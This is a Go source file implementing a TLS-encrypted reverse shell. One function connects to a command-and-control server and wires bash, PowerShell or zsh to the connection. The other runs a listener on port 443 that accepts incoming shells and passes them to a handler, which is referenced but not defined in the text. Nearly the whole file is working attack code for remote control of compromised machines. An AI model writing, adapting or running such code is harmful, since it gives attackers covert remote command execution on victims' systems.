package main

import (
	"crypto/tls"
	"log"
	"os"
	"os/exec"
	"runtime"
)

func encryptedReverseShellHost(connstr string) {

	// Establish connection
	conf := &tls.Config{}
	conn, err := tls.Dial("tcp", connstr, conf)
	if err != nil {
		log.Println("An error occurred while connecting to CC server:", err)
		os.Exit(1)
	} else {
		log.Println("Successfully connected to CC server")
	}

	// make sure connection is closed when process finishes
	defer conn.Close()

	// start local shell
	os := runtime.GOOS
	shell := exec.Command("/bin/bash")
	switch os {
	case "windows":
		shell = exec.Command("powershell.exe")
	case "linux":
		shell = exec.Command("/bin/bash")
	case "darwin":
		shell = exec.Command("/bin/zsh")
	}

	// connect shell to server
	shell.Stdin = conn
	shell.Stdout = conn
	shell.Stderr = conn
	shell.Run()

}

// example of CC server that sends a user defined command to remote shell once a connection is initialized by
// the remote host
func encryptedReverseShellCC(cmd string) {

	// load server certificate/public key and private key
	cer, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Printf("An error occured while loading TLS keys: %v\n", err)
		os.Exit(1)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cer}}

	// start a tcp/tls listener on the specified port
	listener, err := tls.Listen("tcp", "localhost:443", config)
	if err != nil {
		log.Printf("An error occurred while initializing the listener on 443: %v\n", err)
		os.Exit(2)
	} else {
		log.Println("Listening on tcp port 443...")
	}

	// Create channel for returns from goroutines
	ch := make(chan []byte)

	// infinite loop waiting for connections and handing them to the handler function
	for {
		connection, err := listener.Accept()
		if err != nil {
			log.Printf("An error occurred during an attempted connection: %v\n", err)
		}
		// concurrently handle all incoming connections
		// uses same handling function as reegular reverse shell
		go handleRevConnection(connection, cmd, ch)
	}
}
